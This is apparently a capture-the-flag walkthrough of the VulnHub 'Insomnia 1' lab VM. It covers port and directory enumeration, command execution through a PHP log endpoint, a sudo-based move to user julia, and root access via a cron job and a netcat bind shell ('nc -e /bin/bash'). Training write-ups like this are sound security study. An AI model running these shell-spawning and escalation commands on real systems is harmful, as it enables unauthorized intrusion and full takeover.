<p>Title: <strong>Insomnia 1</strong> VM on VulnHub.</p>
<p><strong>Author:</strong> AL1ENUM</p>

<hr>

<h2>📘 Table of Contents</h2>

<ul>
  <li><a href="#overview">Overview</a></li>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#web-application-analysis">Web Application Analysis</a></li>
  <li><a href="#initial-foothold">Initial Foothold</a></li>
  <li><a href="#privilege-escalation">Privilege Escalation</a></li>
  <li><a href="#flags">Flags</a></li>
</ul>

<hr>

<h2 id="overview">📝 Overview</h2>

<p>The goal of this walkthrough is to capture all available flags from the VulnHub <strong>Insomnia</strong> virtual machine by exploiting weaknesses through enumeration, web analysis, and privilege escalation.</p>

<hr>

<h2 id="enumeration">🔍 Enumeration</h2>

<h3>Host Discovery</h3>

<p>First, we used <code>netdiscover</code> to find the IP address of the target VM.</p>

<img src="images/Screenshot%20(160).png" alt="Netdiscover Output" width="600"/>

<h3>Port Scanning</h3>

<p>Performed a comprehensive port scan using <code>nmap</code>:</p>

<pre><code>nmap -sV -sC -T4 -p- 192.168.0.102</code></pre>

<img src="images/Screenshot%20(161).png" alt="Nmap Scan Output" width="600"/>

<p>This revealed a web server running on port 80.</p>

<hr>

<h2 id="web-application-analysis">🌐 Web Application Analysis</h2>

<h3>Initial Access</h3>

<p>Accessing <code>http://192.168.0.102</code> presents a default Apache web page.</p>

<img src="images/Screenshot%20(162).png" alt="Apache Default Page" width="600"/>

<h3>Directory Bruteforce</h3>

<p>Ran <code>gobuster</code> to enumerate hidden directories:</p>

<pre><code>gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/common.txt</code></pre>

<img src="images/Screenshot%20(165).png" alt="Gobuster Results" width="600"/>

<p>Found <code>/logfiles/</code> directory.</p>

<h3>FFUF for Deeper Discovery</h3>

<pre><code>ffuf -u http://192.168.0.102/logfiles/FUZZ -w /usr/share/wordlists/dirb/common.txt</code></pre>

<img src="images/Screenshot%20(167).png" alt="FFUF Results" width="600"/>

<p>This yielded accessible log files.</p>

<hr>

<h2 id="initial-foothold">🚪 Initial Foothold</h2>

<p>Examined <code>logfiles/</code> contents and found a <code>.php</code> file containing system commands, suggesting an RCE vulnerability.</p>

<img src="images/Screenshot%20(168).png" alt="Log File with RCE" width="600"/>

<pre><code>curl http://192.168.0.102/logfiles/log.php?cmd=id</code></pre>

<p>This confirmed code execution as the web user.</p>

<hr>

<h2 id="privilege-escalation">⬆️ Privilege Escalation</h2>

<p>After spawning a reverse shell using <code>bash -i</code>, we found a user named <code>julia</code>. To gain access as <code>julia</code>, we created a simple shell script and executed it with sudo:</p>

<img src="images/Screenshot%20(172).png" alt="Create start.sh" width="600"/>


<pre><code>echo '/bin/bash' &gt;&gt; /var/www/html/start.sh</code></pre>

<pre><code>sudo -u julia bash /var/www/html/start.sh</code></pre>

<img src="images/Screenshot%20(174).png" alt="Create start.sh" width="600"/>

<p>This gave us an interactive shell as <code>julia</code>. We verified access by reading the user flag:</p>

<pre><code>cat /home/julia/user.txt</code></pre>

<img src="images/Screenshot%20(175).png" alt="User Flag as julia" width="600"/>


<h3>Examining Crontab for Privilege Escalation</h3>

<p>Checked the crontab file to find scheduled tasks that might help escalate privileges:</p>

<pre><code>cat /etc/crontab</code></pre>

<img src="images/Screenshot%20(177).png" alt="Crontab Contents" width="600"/>

<p>Found a cron job running <code>/var/cron/check.sh</code> which requires root privileges.</p>

<h3>Exploiting Cron Job for Root Access</h3>

<p>The <code>check.sh</code> script listens on port <code>9003</code>. We leveraged this to gain root access by creating a backdoor shell on port 9003.</p>

<p>Checked user ID to confirm root privileges:</p>

<pre><code>nc -nlvp 9003 -e /bin/bash &</code></pre>

<pre><code>id</code></pre>

<img src="images/Screenshot%20(180).png" alt="Listening on Port 9003" width="600"/>

<h3>Accessing Root Flag</h3>

<p>Listed root directory to confirm access to the root flag:</p>

<pre><code>ls -al /root/</code></pre>

<img src="images/Screenshot%20(181).png" alt="Listing Root Directory" width="600"/>

<p>Finally, read the root flag:</p>

<pre><code>cat /root/root.txt</code></pre>

<img src="images/Screenshot%20(182).png" alt="Root Flag" width="600"/>

<hr>

<h2 id="flags">🏁 Flags</h2>

<h3>User Flag</h3>

<pre><code>cat /home/julia/user.txt</code></pre>

<img src="images/Screenshot%20(172).png" alt="User Flag" width="600"/>

<h3>Root Flag</h3>

<pre><code>cat /root/root.txt</code></pre>

<img src="images/Screenshot%20(182).png" alt="Root Flag" width="600"/>

<hr>

<p>💥 <strong>Mission accomplished!</strong> Root access and all flags captured.</p>
